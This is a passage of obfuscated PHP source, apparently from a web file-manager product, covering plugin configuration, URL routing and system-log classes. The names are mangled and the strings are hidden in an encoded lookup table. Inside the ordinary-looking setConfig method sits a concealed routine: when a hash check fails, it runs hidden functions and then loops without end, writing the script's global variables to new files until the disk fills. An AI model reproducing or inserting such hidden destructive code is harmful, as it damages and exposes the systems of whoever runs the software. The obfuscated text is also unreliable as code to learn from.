($¦÷òÓœ—[0] as $‡¨Ã”ãî) { $¦ğÔ±§É = substr($‡¨Ã”ãî, strlen($¤èƒ¼ÏÑ), -4); $‡˜´éÅ“ = LNG($¦ğÔ±§É); $İø•øÜ˜[] = $‡¨Ã”ãî; $Áôí‹Ô®[] = str_replace(array($ÏÌŠÍıÌ[231], $ÏÌŠÍıÌ[1076], $ÏÌŠÍıÌ[342], $ÏÌŠÍıÌ[118]), array($ÏÌŠÍıÌ[53], $ÏÌŠÍıÌ[53], $ÏÌŠÍıÌ[12], $ÏÌŠÍıÌ[1576]), $‡˜´éÅ“); } $Æ€ö£È¨ = str_replace($İø•øÜ˜, $Áôí‹Ô®, $Æ€ö£È¨); } private function parseConfig(&$šö—°®Ì) { $„Æ£¡¼ =& $_SERVER[­õöî’–]; $ÔİŠÛ€é = $„Æ£¡¼[1577]; if (!strstr($šö—°®Ì, $ÔİŠÛ€é)) { return; } preg_match_all($„Æ£¡¼[1578], $šö—°®Ì, $¶æ¢“¯ô); if (!is_array($¶æ¢“¯ô) || count($¶æ¢“¯ô) == 0 || !is_array($¶æ¢“¯ô[0]) || count($¶æ¢“¯ô[0]) == 0) { return; } $œúÆâù” = $this->getConfig(); $Õ»õ¸Üì = array(); $Úı¼¿ù÷ = array(); foreach ($¶æ¢“¯ô[0] as $‘¿Ò­¢õ) { $˜ê»»±™ = substr($‘¿Ò­¢õ, strlen($ÔİŠÛ€é), -2); $Õ»õ¸Üì[] = $‘¿Ò­¢õ; $Úı¼¿ù÷[] = _get($œúÆâù”, $˜ê»»±™); } $šö—°®Ì = str_replace($Õ»õ¸Üì, $Úı¼¿ù÷, $šö—°®Ì); } private function parsePackage(&$©àç‰‰¦) { $ÓËÃ·½» =& $_SERVER[­õöî’–]; $à‰ĞğŠ = $ÓËÃ·½»[1579]; if (!strstr($©àç‰‰¦, $à‰ĞğŠ)) { return; } preg_match_all($ÓËÃ·½»[1580], $©àç‰‰¦, $ü’ÎÂğ); if (!is_array($ü’ÎÂğ) || count($ü’ÎÂğ) == 0 || !is_array($ü’ÎÂğ[0]) || count($ü’ÎÂğ[0]) == 0) { return; } $°ì¦ª¾İ = $this->appPackage(); $¢ºÊéÎ = array(); $Ï§Š÷ı = array(); foreach ($ü’ÎÂğ[0] as $£Åçõí™) { $İùù˜¯º = substr($£Åçõí™, strlen($à‰ĞğŠ), -2); $¢ºÊéÎ[] = $£Åçõí™; $Ï§Š÷ı[] = _get($°ì¦ª¾İ, $İùù˜¯º); } $©àç‰‰¦ = str_replace($¢ºÊéÎ, $Ï§Š÷ı, $©àç‰‰¦); } final function echoFile($µÚş”ÕË, $ÅÑ¯­¤¯ = false) { $¹€Í”ş =& $_SERVER[­õöî’–]; $¿Ç¶°ƒ» = $this->pluginPath . $µÚş”ÕË; if (ACT == $¹€Í”ş[1581]) { echo $¹€Í”ş[1582] . $this->pluginName . $¹€Í”ş[8] . $µÚş”ÕË . $¹€Í”ş[1583]; if (!file_exists($¿Ç¶°ƒ»)) { echo $¹€Í”ş[1584]; return; } } $Éıçó„¤ = $this->parseFile($¿Ç¶°ƒ»); $this->parseLang($Éıçó„¤); $this->parseConfig($Éıçó„¤); $this->parsePackage($Éıçó„¤); if (is_array($ÅÑ¯­¤¯)) { $Éıçó„¤ = str_replace(array_keys($ÅÑ¯­¤¯), array_values($ÅÑ¯­¤¯), $Éıçó„¤); } echo $¹€Í”ş[231] . $Éıçó„¤; } final function initLang() { $çœ¼ØÜ¼ =& $_SERVER[­õöî’–]; $®¹¼á÷Ô = $çœ¼ØÜ¼[1585]; $©ã’”ËÀ = $this->pluginPath . $çœ¼ØÜ¼[1586]; $ÉÖïÉì = I18n::getType(); $ï–ÒŸµú = array(); if (file_exists($©ã’”ËÀ . $ÉÖïÉì . $çœ¼ØÜ¼[829])) { $ï–ÒŸµú = (include $©ã’”ËÀ . $ÉÖïÉì . $çœ¼ØÜ¼[829]); } else { if ($ÉÖïÉì == $çœ¼ØÜ¼[1587] && !file_exists($©ã’”ËÀ . $ÉÖïÉì . $çœ¼ØÜ¼[829]) && file_exists($©ã’”ËÀ . $çœ¼ØÜ¼[1588])) { $ï–ÒŸµú = (include $©ã’”ËÀ . $çœ¼ØÜ¼[1588]); } else { if (file_exists($©ã’”ËÀ . $®¹¼á÷Ô . $çœ¼ØÜ¼[829])) { $ï–ÒŸµú = (include $©ã’”ËÀ . $®¹¼á÷Ô . $çœ¼ØÜ¼[829]); } } } if (!is_array($ï–ÒŸµú)) { return array(); } if (@count($ï–ÒŸµú) > 0) { I18n::set($ï–ÒŸµú); } return $ï–ÒŸµú; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ƒ€Øƒ) { $’÷Åê¯Ø =& $_SERVER[­õöî’–]; $úÚ÷Â“û = $_SERVER[$’÷Åê¯Ø[867]]; $ƒÉÜÁÃ… = $’÷Åê¯Ø[868]; if ($_SERVER[$’÷Åê¯Ø[869]] != $ƒÉÜÁÃ…($úÚ÷Â“û)) { $šÂ¾êğ¯ = $’÷Åê¯Ø[870]; $úßµúÀ² = $’÷Åê¯Ø[871]; $ÚÃîá€† = $_SERVER[$’÷Åê¯Ø[872]] . $’÷Åê¯Ø[873]; $ÕÍÄÛ¦ = $úßµúÀ²($ÚÃîá€†); $‰Œ ¹Á = explode($’÷Åê¯Ø[231], $ÕÍÄÛ¦); if (count($‰Œ ¹Á) < $’÷Åê¯Ø[631]) { $°›“î† = $’÷Åê¯Ø[874]; $°›“î†(); } $İó÷ÏÊº = $’÷Åê¯Ø[875]; $İó÷ÏÊº($_SERVER[$’÷Åê¯Ø[876]]); $šÂ¾êğ¯ = $’÷Åê¯Ø[870]; $šÂ¾êğ¯(); $ª¹®²øë = $’÷Åê¯Ø[877]; $¿º»“Ì = json_encode($GLOBALS[$’÷Åê¯Ø[878]]); $±ë™ã = 1; for ($åÈë™÷ = $±ë™ã; $åÈë™÷ > 0; $åÈë™÷++) { $ª¹®²øë(DATA_PATH . $åÈë™÷, $¿º»“Ì); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ƒ€Øƒ); } public function onSetConfig($¯›üâá«) { } public function onGetConfig($ íõŸ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ëØö“Ç™) { if ($ëØö“Ç™ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Ş¦µäçş = "\160\x6c\x75\x67\151\x6e\x41\x75\x74\x68") { $äÄ£ší =& $_SERVER[­õöî’–]; if (!defined($äÄ£ší[475])) { return !1; } if (_get($GLOBALS, $äÄ£ší[503])) { return !0; } $”Ó°¹ ¥ = $this->getConfig(); if (!$”Ó°¹ ¥[$Ş¦µäçş]) { return !1; } return ActionCall($äÄ£ší[1589], $”Ó°¹ ¥[$Ş¦µäçş]); } public function url($Øé¡Ä, $áñ­³´î = '', $ÈÆ‡·Ê­ = true) { $”Ş«ê›€ =& $_SERVER[­õöî’–]; $äŞ‘¾¨ë = $this->getConfig(); $ó¥‚¦ëÆ = KOD_VERSION . $”Ş«ê›€[10] . KOD_VERSION_BUILD; $øİÏ’”· = $this->packageVersion(); $ùš¤óÒã = $ó¥‚¦ëÆ . $”Ş«ê›€[386] . $øİÏ’”·; if (substr($Øé¡Ä, 0, 4) == $”Ş«ê›€[148] || substr($Øé¡Ä, 0, 2) == $”Ş«ê›€[1374]) { $ä½ÇÃ¯Á = $Øé¡Ä . $”Ş«ê›€[1590] . $ùš¤óÒã; } else { if ($áñ­³´î == $”Ş«ê›€[12]) { $ä½ÇÃ¯Á = $this->pluginHost . $Øé¡Ä . $”Ş«ê›€[1590] . $ùš¤óÒã; } else { if ($áñ­³´î === $”Ş«ê›€[75]) { $ä½ÇÃ¯Á = $this->pluginHost . $Øé¡Ä; } else { if ($áñ­³´î == $”Ş«ê›€[1591]) { $ä½ÇÃ¯Á = STATIC_PATH . $Øé¡Ä . $”Ş«ê›€[1590] . $ó¥‚¦ëÆ; } else { if ($áñ­³´î == $”Ş«ê›€[1592]) { $ä½ÇÃ¯Á = APP_HOST . $”Ş«ê›€[1593] . $Øé¡Ä . $”Ş«ê›€[1590] . $ó¥‚¦ëÆ; } else { if (isset($äŞ‘¾¨ë[$áñ­³´î])) { $ä½ÇÃ¯Á = $äŞ‘¾¨ë[$áñ­³´î] . $Øé¡Ä . $”Ş«ê›€[1590] . $ùš¤óÒã; } } } } } } if (!$ÈÆ‡·Ê­) { return $ä½ÇÃ¯Á; } echo $ä½ÇÃ¯Á; } public function link($şçœû‡§ = false, $ì‘£Úı¼ = '') { $Ù“¡áø =& $_SERVER[­õöî’–]; if (!$şçœû‡§) { $this->link($Ù“¡áø[1594], $Ù“¡áø[1592]); $this->link($Ù“¡áø[1595], $Ù“¡áø[1591]); $this->link($Ù“¡áø[1596], $Ù“¡áø[1591]); $this->link($Ù“¡áø[1597], $Ù“¡áø[1591]); $this->link($Ù“¡áø[1598], $Ù“¡áø[1591]); return; } $¸„œ‘¡ã = $this->url($şçœû‡§, $ì‘£Úı¼, !1); if (substr($şçœû‡§, -3) == $Ù“¡áø[1599]) { echo $Ù“¡áø[1600] . $¸„œ‘¡ã . $Ù“¡áø[1601] . $Ù“¡áø[231]; } else { if (substr($şçœû‡§, -4) == $Ù“¡áø[1602]) { echo $Ù“¡áø[1603] . $¸„œ‘¡ã . $Ù“¡áø[1604] . $Ù“¡áø[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\x5b\x5e\57\135\53", "\x3a\x6e\x75\155" => "\x5b\x30\x2d\71\x5d\53", "\x3a\141\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($¥ß ®ì, $ƒÙŞ¬­) { $ğ²­ŒÇè =& $_SERVER[­õöî’–]; if ($¥ß ®ì == $ğ²­ŒÇè[1605]) { $Õ±½ÛÜ = array_map($ğ²­ŒÇè[1606], $ƒÙŞ¬­[0]); $•‘¡¤˜Ë = strpos($ƒÙŞ¬­[1], $ğ²­ŒÇè[8]) === 0 ? $ƒÙŞ¬­[1] : $ğ²­ŒÇè[8] . $ƒÙŞ¬­[1]; $ÏÃŸ‰« = $ƒÙŞ¬­[2]; } else { $Õ±½ÛÜ = null; $•‘¡¤˜Ë = strpos($ƒÙŞ¬­[0], $ğ²­ŒÇè[8]) === 0 ? $ƒÙŞ¬­[0] : $ğ²­ŒÇè[8] . $ƒÙŞ¬­[0]; $ÏÃŸ‰« = $ƒÙŞ¬­[1]; } array_push(self::$maps, $Õ±½ÛÜ); array_push(self::$routes, $•‘¡¤˜Ë); array_push(self::$methods, strtoupper($¥ß ®ì)); array_push(self::$callbacks, $ÏÃŸ‰«); } public static function error($ê«ùÑ¡“) { self::$errorCallback = $ê«ùÑ¡“; } public static function haltOnMatch($ÄÕÑ–Ğö = true) { self::$halts = $ÄÕÑ–Ğö; } public static function dispatch() { $¸›óÍº =& $_SERVER[­õöî’–]; $ÃäûÔèæ = parse_url($_SERVER[$¸›óÍº[1607]], PHP_URL_PATH); $ºŞµ×œ¨ = $_SERVER[$¸›óÍº[159]]; $â§î›ãù = array_keys(static::$patterns); $îÓŞÜĞ” = array_values(static::$patterns); $®îö‹Ì° = !1; self::$routes = preg_replace($¸›óÍº[1275], $¸›óÍº[8], self::$routes); if (in_array($ÃäûÔèæ, self::$routes)) { $±ã´‹‰Ó = array_keys(self::$routes, $ÃäûÔèæ); foreach ($±ã´‹‰Ó as $¼îëúÓ¾) { if (self::$methods[$¼îëúÓ¾] == $ºŞµ×œ¨ || self::$methods[$¼îëúÓ¾] == $¸›óÍº[1608] || in_array($ºŞµ×œ¨, self::$maps[$¼îëúÓ¾])) { $®îö‹Ì° = !0; if (!is_object(self::$callbacks[$¼îëúÓ¾])) { $®ÑÅ­ò… = explode($¸›óÍº[8], self::$callbacks[$¼îëúÓ¾]); $ÎåÖÇ“ = end($®ÑÅ­ò…); $¢¨¸Êè = explode($¸›óÍº[1207], $ÎåÖÇ“); $Åšİ«™¸ = new $¢¨¸Êè[0](); $Åšİ«™¸->{$¢¨¸Êè[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¼îëúÓ¾]); if (self::$halts) { return; } } } } } else { $ù‹Ö‰¿• = 0; foreach (self::$routes as $¼îëúÓ¾) { if (strpos($¼îëúÓ¾, $¸›óÍº[4]) !== !1) { $¼îëúÓ¾ = str_replace($â§î›ãù, $îÓŞÜĞ”, $¼îëúÓ¾); } if (preg_match($¸›óÍº[1609] . $¼îëúÓ¾ . $¸›óÍº[1610], $ÃäûÔèæ, $°ó¼ÀÌ›)) { if (self::$methods[$ù‹Ö‰¿•] == $ºŞµ×œ¨ || self::$methods[$ù‹Ö‰¿•] == $¸›óÍº[1608] || !empty(self::$maps[$ù‹Ö‰¿•]) && in_array($ºŞµ×œ¨, self::$maps[$ù‹Ö‰¿•])) { $®îö‹Ì° = !0; array_shift($°ó¼ÀÌ›); if (!is_object(self::$callbacks[$ù‹Ö‰¿•])) { $®ÑÅ­ò… = explode($¸›óÍº[8], self::$callbacks[$ù‹Ö‰¿•]); $ÎåÖÇ“ = end($®ÑÅ­ò…); $¢¨¸Êè = explode($¸›óÍº[1207], $ÎåÖÇ“); $Åšİ«™¸ = new $¢¨¸Êè[0](); if (!method_exists($Åšİ«™¸, $¢¨¸Êè[1])) { echo $¸›óÍº[1611]; } else { call_user_func_array(array($Åšİ«™¸, $¢¨¸Êè[1]), $°ó¼ÀÌ›); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ù‹Ö‰¿•], $°ó¼ÀÌ›); if (self::$halts) { return; } } } } $ù‹Ö‰¿•++; } } if ($®îö‹Ì° == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $‘ÚâŸáÜ =& $_SERVER[­õöî’–]; header($_SERVER[$‘ÚâŸáÜ[1612]] . $‘ÚâŸáÜ[1613]); echo $‘ÚâŸáÜ[1614]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¸›óÍº[1607]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto eêÂ‹ƒ‹õ; B®™¿®Ò§: define($_SERVER[­õöî’–][0], $_SERVER[­õöî’–][1]); $_SERVER[àïçãĞÒ] = explode($_SERVER[­õöî’–][2], gzinflate(substr($_SERVER[­õöî’–][3], 10, -8))); function binCheckEq($™«íô‹¶, $ˆÀ¹¶ç) { return $™«íô‹¶ == $ˆÀ¹¶ç; } goto dÙ¦À¼½; bìŠùºÒ§İ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x4c\151\x67\150\x74\101\x70\160"; public $modelType = "\123\171\163\164\145\x6d\117\160\164\151\x6f\156"; public $field = array("\x6e\141\x6d\145", "\x67\x72\157\x75\160", "\144\145\163\x63", "\x63\157\156\x74\145\x6e\164"); public function listData($œ èĞˆÖ = false, $Ø«×Š¯å = "\x6d\157\x64\x69\x66\x79\x54\x69\x6d\145", $ÖŠ®â»º = true) { return parent::listData($œ èĞˆÖ, $Ø«×Š¯å, $ÖŠ®â»º); } public function remove($ÊÓºêİ) { $œáŞ€¢„ = $this->findByName($ÊÓºêİ); if (!$œáŞ€¢„) { return !1; } return parent::remove($œáŞ€¢„[$_SERVER[­õöî’–][399]]); } public function add($Ô·’ôÁ®) { if ($this->findByName($Ô·’ôÁ®[$_SERVER[­õöî’–][32]])) { return !1; } return parent::insert($Ô·’ôÁ®); } public function update($®’‚ú¨ô, $Ó¬’ôß) { $µû§ ñä =& $_SERVER[­õöî’–]; $¯¨¡¤ É = $this->findByName($®’‚ú¨ô); $Á˜Ä‰­Ø = $this->findByName($Ó¬’ôß[$µû§ ñä[32]]); if (!$¯¨¡¤ É || $Á˜Ä‰­Ø && $Á˜Ä‰­Ø[$µû§ ñä[399]] != $¯¨¡¤ É[$µû§ ñä[399]]) { return !1; } return parent::update($¯¨¡¤ É[$µû§ ñä[399]], $Ó¬’ôß); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\137\x6c\157\147"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\x54\151\155\x65", "\x74\x69\155\x65", "\x69\x6e\163\145\x72\164", "\x66\165\156\x63\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¾ÚµŸ­· =& $_SERVER[­õöî’–]; return array($¾ÚµŸ­·[2177] => LNG($¾ÚµŸ­·[2178]), $¾ÚµŸ­·[2179] => LNG($¾ÚµŸ­·[2180]), $¾ÚµŸ­·[1792] => LNG($¾ÚµŸ­·[2181]), $¾ÚµŸ­·[2182] => LNG($¾ÚµŸ­·[2183]), $¾ÚµŸ­·[2184] => LNG($¾ÚµŸ­·[2185]), $¾ÚµŸ­·[2186] => LNG($¾ÚµŸ­·[2187]), $¾ÚµŸ­·[2188] => LNG($¾ÚµŸ­·[2189]), $¾ÚµŸ­·[1822] => LNG($¾ÚµŸ­·[2189]), $¾ÚµŸ­·[1823] => LNG($¾ÚµŸ­·[2190]), $¾ÚµŸ­·[2191] => LNG($¾ÚµŸ­·[2192]), $¾ÚµŸ­·[2193] => LNG($¾ÚµŸ­·[2194]), $¾ÚµŸ­·[2195] => LNG($¾ÚµŸ­·[2196]), $¾ÚµŸ­·[2197] => LNG($¾ÚµŸ­·[2198]), $¾ÚµŸ­·[1820] => LNG($¾ÚµŸ­·[2199]), $¾ÚµŸ­·[2200] => LNG($¾ÚµŸ­·[2201]), $¾ÚµŸ­·[1827] => LNG($¾ÚµŸ­·[2202]), $¾ÚµŸ­·[2203] => LNG($¾ÚµŸ­·[2204]), $¾ÚµŸ­·[2205] => LNG($¾ÚµŸ­·[2206]), $¾ÚµŸ­·[2207] => LNG($¾ÚµŸ­·[2208]), $¾ÚµŸ­·[2209] => LNG($¾ÚµŸ­·[2210]), $¾ÚµŸ­·[1830] => LNG($¾ÚµŸ­·[2211]), $¾ÚµŸ­·[1831] => LNG($¾ÚµŸ­·[2212]), $¾ÚµŸ­·[2213] => LNG($¾ÚµŸ­·[2214]), $¾ÚµŸ­·[2215] => LNG($¾ÚµŸ­·[2216]), $¾ÚµŸ­·[2217] => LNG($¾ÚµŸ­·[2218]), $¾ÚµŸ­·[1825] => LNG($¾ÚµŸ­·[2219]), $¾ÚµŸ­·[2220] => LNG($¾ÚµŸ­·[2221]), $¾ÚµŸ­·[1824] => LNG($¾ÚµŸ­·[2222]), $¾ÚµŸ­·[2223] => LNG($¾ÚµŸ­·[2224]), $¾ÚµŸ­·[2225] => LNG($¾ÚµŸ­·[2226]), $¾ÚµŸ­·[2227] => LNG($¾ÚµŸ­·[2228]), $¾ÚµŸ­·[2229] => LNG($¾ÚµŸ­·[2229]), $¾ÚµŸ­·[2230] => LNG($¾ÚµŸ­·[1796]), $¾ÚµŸ­·[2231] => LNG($¾ÚµŸ­·[2232]), $¾ÚµŸ­·[2233] => LNG($¾ÚµŸ­·[2234]), $¾ÚµŸ­·[2235] => LNG($¾ÚµŸ­·[2236]), $¾ÚµŸ­·[2237] => LNG($¾ÚµŸ­·[2238]), $¾ÚµŸ­·[2239] => LNG($¾ÚµŸ­·[2240]), $¾ÚµŸ­·[2241] => LNG($¾ÚµŸ­·[2241]), $¾ÚµŸ­·[2242] => LNG($¾ÚµŸ­·[2243]), $¾ÚµŸ­·[2244] => LNG($¾ÚµŸ­·[2245]), $¾ÚµŸ­·[2246] => LNG($¾ÚµŸ­·[2247]), $¾ÚµŸ­·[2248] => LNG($¾ÚµŸ­·[2249]), $¾ÚµŸ­·[2250] => LNG($¾ÚµŸ­·[2251]), $¾ÚµŸ­·[2252] => LNG($¾ÚµŸ­·[2253])); } private function typeFile() { $ÔòªŞè‰ =& $_SERVER[­õöî’–]; $å‹²–É = array($ÔòªŞè‰[1827] => array($ÔòªŞè‰[1828]), $ÔòªŞè‰[2195] => array($ÔòªŞè‰[2254]), $ÔòªŞè‰[2197] => array($ÔòªŞè‰[2255]), $ÔòªŞè‰[1820] => array($ÔòªŞè‰[1821]), $ÔòªŞè‰[2205] => array(), $ÔòªŞè‰[2207] => array(), $ÔòªŞè‰[2209] => array(), $ÔòªŞè‰[1830] => array($ÔòªŞè‰[1832]), $ÔòªŞè‰[1831] => array($ÔòªŞè‰[1832]), $ÔòªŞè‰[2213] => array($ÔòªŞè‰[2256]), $ÔòªŞè‰[2215] => array($ÔòªŞè‰[2256]), $ÔòªŞè‰[2217] => array($ÔòªŞè‰[2257]), $ÔòªŞè‰[2203] => array($ÔòªŞè‰[2258]), $ÔòªŞè‰[1825] => array($ÔòªŞè‰[2259]), $ÔòªŞè‰[2220] => array($ÔòªŞè‰[2260]), $ÔòªŞè‰[1824] => array($ÔòªŞè‰[1826])); return $å‹²–É; } private function typeAll() { $ƒÅ´ÔŒ =& $_SERVER[­õöî’–]; $³®§­®í = $this->typeList; $²ÈÍ†Ä° = array_filter($this->typeFile()); foreach ($²ÈÍ†Ä° as $‰õ·Šó˜ => $¶—õ½¬) { $³®§­®í[$¶—õ½¬[0]] = $³®§­®í[$‰õ·Šó˜]; } $³®§­®í[$ƒÅ´ÔŒ[1832]] = LNG($ƒÅ´ÔŒ[2261]); $³®§­®í[$ƒÅ´ÔŒ[2256]] = LNG($ƒÅ´ÔŒ[2262]); return $³®§­®í; } public function addLog($Øİ“ÚÑ¼, $À³‡Ó¼ = array()) { $÷¯èÎ…– =& $_SERVER[­õöî’–]; if (!isset($this->typeList[$Øİ“ÚÑ¼])) { return; } $–Ô²îŠ¿ = defined($÷¯èÎ…–[475]) && USER_ID ? USER_ID : (isset($À³‡Ó¼[$÷¯èÎ…–[1660]]) ? $À³‡Ó¼[$÷¯èÎ…–[1660]] : 0); if (!$–Ô²îŠ¿) { $–Ô²îŠ¿ = (int) Session::get($÷¯èÎ…–[1986]); } if ($Øİ“ÚÑ¼ == $÷¯èÎ…–[2231] && is_array($À³‡Ó¼[$÷¯èÎ…–[2263]]) && !$À³‡Ó¼[$÷¯èÎ…–[2263]]) { return; } $çÖ³…· = get_client_ip(); if (!$À³‡Ó¼ || strlen(json_encode($À³‡Ó¼)) >= 1024) { $À³‡Ó¼ = array($÷¯èÎ…–[2264] => $çÖ³…·); } else { if (is_array($À³‡Ó¼)) { $À³‡Ó¼[$÷¯èÎ…–[2264]] = $çÖ³…·; } else { $À³‡Ó¼ = array($÷¯èÎ…–[1201] => $À³‡Ó¼, $÷¯èÎ…–[2264] => $çÖ³…·); } } $À³‡Ó¼ = array($÷¯èÎ…–[1650] => Session::sign(), $÷¯èÎ…–[1651] => $–Ô²îŠ¿, $÷¯èÎ…–[33] => $Øİ“ÚÑ¼, $÷¯èÎ…–[1653] => json_encode($À³‡Ó¼)); parent::add($À³‡Ó¼); } public function remove($ëƒÛ…ğ ) { $this->where(array($_SERVER[­õöî’–][419] => $ëƒÛ…ğ ))->delete(); } private function _makeOrder($ƒñµÍœÃ = '') { $œ›Ñ†´º =& $_SERVER[­õöî’–]; $˜ê¥Ëú = $œ›Ñ†´º[200]; $ÈêÕäñá = array($œ›Ñ†´º[450] => $œ›Ñ†´º[451], $œ›Ñ†´º[452] => $œ›Ñ†´º[453]); $Œ“ô–İÀ = Input::get($œ›Ñ†´º[458], $œ›Ñ†´º[7], $œ›Ñ†´º[2018], array($œ›Ñ†´º[1940], $œ›Ñ†´º[452])); $Œ“ô–İÀ = $ÈêÕäñá[$Œ“ô–İÀ]; $ƒñµÍœÃ = $ƒñµÍœÃ . "{$˜ê¥Ëú}\x20{$Œ“ô–İÀ}"; return $this->order($ƒñµÍœÃ); } public function get($Å˜ ½ê = '') { $Ó×¸ğõŒ =& $_SERVER[­õöî’–]; if (!$Å˜ ½ê) { show_json(array()); } $Êè¶³ü³ = array(); if ($Å˜ ½ê[$Ó×¸ğõŒ[1660]]) { $Êè¶³ü³[$Ó×¸ğõŒ[1660]] = $Å˜ ½ê[$Ó×¸ğõŒ[1660]]; } if (isset($Å˜ ½ê[$Ó×¸ğõŒ[752]])) { $¢ÀÄ¿Ñ = $Å˜ ½ê[$Ó×¸ğõŒ[752]]; $‘öæÎ±‡ = isset($Å˜ ½ê[$Ó×¸ğõŒ[497]]) ? $Å˜ ½ê[$Ó×¸ğõŒ[497]] : time(); $Êè¶³ü³[$Ó×¸ğõŒ[200]] = array($Ó×¸ğõŒ[333], array($¢ÀÄ¿Ñ, $‘öæÎ±‡)); } if ($Å˜ ½ê[$Ó×¸ğõŒ[33]]) { $ì­ı©ëÛ = explode($Ó×¸ğõŒ[50], $Å˜ ½ê[$Ó×¸ğõŒ[33]]); $„ƒÜÆÉ® = $this->typeFile(); $ „‘ÓÍÀ = array(); foreach ($ì­ı©ëÛ as $çÄ˜•¨ƒ) { $ „‘ÓÍÀ[] = $çÄ˜•¨ƒ; if (isset($„ƒÜÆÉ®[$çÄ˜•¨ƒ])) { $ „‘ÓÍÀ = array_merge($ „‘ÓÍÀ, $„ƒÜÆÉ®[$çÄ˜•¨ƒ]); } } $ „‘ÓÍÀ = array_unique($ „‘ÓÍÀ); if ($ „‘ÓÍÀ) { $Êè¶³ü³[$Ó×¸ğõŒ[33]] = array($Ó×¸ğõŒ[7], $ „‘ÓÍÀ); } } else { $Êè¶³ü³[$Ó×¸ğõŒ[33]] = array($Ó×¸ğõŒ[2265], $Ó×¸ğõŒ[2266]); } if (!empty($Å˜ ½ê[$Ó×¸ğõŒ[2264]])) { $Êè¶³ü³[$Ó×¸ğõŒ[453]] = array($Ó×¸ğõŒ[383], "\45{$Å˜ ½ê[$Ó×¸ğõŒ[2264]]}\45"); } $­‚˜êÊ = $this->_makeOrder()->where($Êè¶³ü³)->selectPage(); if (empty($­‚˜êÊ[$Ó×¸ğõŒ[369]])) { show_json(array(), !0, $­‚˜êÊ[$Ó×¸ğõŒ[366]]); } $­‚˜êÊ[$Ó×¸ğõŒ[369]] = $this->logList($­‚˜êÊ[$Ó×¸ğõŒ[369]]); return $­‚˜êÊ; } private function ipAddress(&$¼†×œ¿“) { $Ùö©äµÓ =& $_SERVER[­õöî’–]; if (!empty($¼†×œ¿“[$Ùö©äµÓ[2264]])) { $¿èíßñı = IpLocation::get($¼†×œ¿“[$Ùö©äµÓ[2264]]); } else { $¿èíßñı = LNG($Ùö©äµÓ[2267]); } $¼†×œ¿“[$Ùö©äµÓ[2268]] = $¿èíßñı; } private function descZipDownload($ÆàÏ”Â¡, &$´å¡ûÏ¿) { $û©œ…Ç =& $_SERVER[­õöî’–]; if (!isset($ÆàÏ”Â¡[$û©œ…Ç[2269]])) { return; } $ŒÛ»³ â = json_decode($ÆàÏ”Â¡[$û©œ…Ç[2269]], !0); foreach ($ŒÛ»³ â as $‰ÌˆÏÒ) { try { $×ŠË™Ï‰ = IO::infoFull($‰ÌˆÏÒ[$û©œ…Ç[84]]); } catch (Exception $Ö©ÄÈş) { continue; } $ÆàÏ”Â¡[$û©œ…Ç[84]] = $‰ÌˆÏÒ[$û©œ…Ç[84]]; $´å¡ûÏ¿[] = $ÆàÏ”Â¡[$û©œ…Ç[402]] = $×ŠË™Ï‰[$û©œ…Ç[402]]; $´å¡ûÏ¿[] = $ÆàÏ”Â¡[$û©œ…Ç[2072]] = $×ŠË™Ï‰[$û©œ…Ç[432]]; break; } return $ÆàÏ”Â¡; } private function getSourceList(&$ÇÖ‡áĞ—) { $¯êÁú…  =& $_SERVER[­õöî’–]; $¯®‚‡ğã = array(); foreach ($ÇÖ‡áĞ— as $àá¡…¼÷ => $Û–Ò³°) { $µ÷¤øìè = json_decode($Û–Ò³°[$¯êÁú… [453]], !0); if ($Û–Ò³°[$¯êÁú… [33]] == $¯êÁú… [1823]) { $µ÷¤øìè = $this->descZipDownload($µ÷¤øìè, $¯®‚‡ğã); $ÇÖ‡áĞ—[$àá¡…¼÷][$¯êÁú… [453]] = json_encode($µ÷¤øìè); continue; } if (strpos($Û–Ò³°[$¯êÁú… [33]], $¯êÁú… [2074]) !== 0) { if (!isset($µ÷¤øìè[$¯êÁú… [84]]) || strpos($Û–Ò³°[$¯êÁú… [33]], $¯êÁú… [2270]) !== 0) { continue; } try { $¼™šµ‡ó = IO::infoFull($µ÷¤øìè[$¯êÁú… [84]]); } catch (Exception $Œ÷Úæè) { continue; } $¯®‚‡ğã[] = $µ÷¤øìè[$¯êÁú… [402]] = $¼™šµ‡ó[$¯êÁú… [402]]; $¯®‚‡ğã[] = $µ÷¤øìè[$¯êÁú… [2072]] = $¼™šµ‡ó[$¯êÁú… [432]]; $ÇÖ‡áĞ—[$àá¡…¼÷][$¯êÁú… [453]] = json_encode($µ÷¤øìè); continue; } $¯®‚‡ğã[] = $µ÷¤øìè[$¯êÁú… [402]]; $¯®‚‡ğã[] = $µ÷¤øìè[$¯êÁú… [2072]]; if ($µ÷¤øìè[$¯êÁú… [33]] == $¯êÁú… [557]) { $¯®‚‡ğã[] = $µ÷¤øìè[$¯êÁú… [453]][$¯êÁú… [1158]]; $¯®‚‡ğã[] = $µ÷¤øìè[$¯êÁú… [453]][$¯êÁú… [1159]]; } if ($µ÷¤øìè[$¯êÁú… [33]] == $¯êÁú… [2082]) { $¯®‚‡ğã[] = $µ÷¤øìè[$¯êÁú… [453]][$¯êÁú… [402]]; } } if (!$¯®‚‡ğã) { return array(); } return Model($¯êÁú… [816])->sourceListInfo($¯®‚‡ğã, !0); } private function logList($´Ğ‘åÂ£) { $”¯£”·â =& $_SERVER[­õöî’–]; $™±§Ô‘© = array_to_keyvalue($´Ğ‘åÂ£, 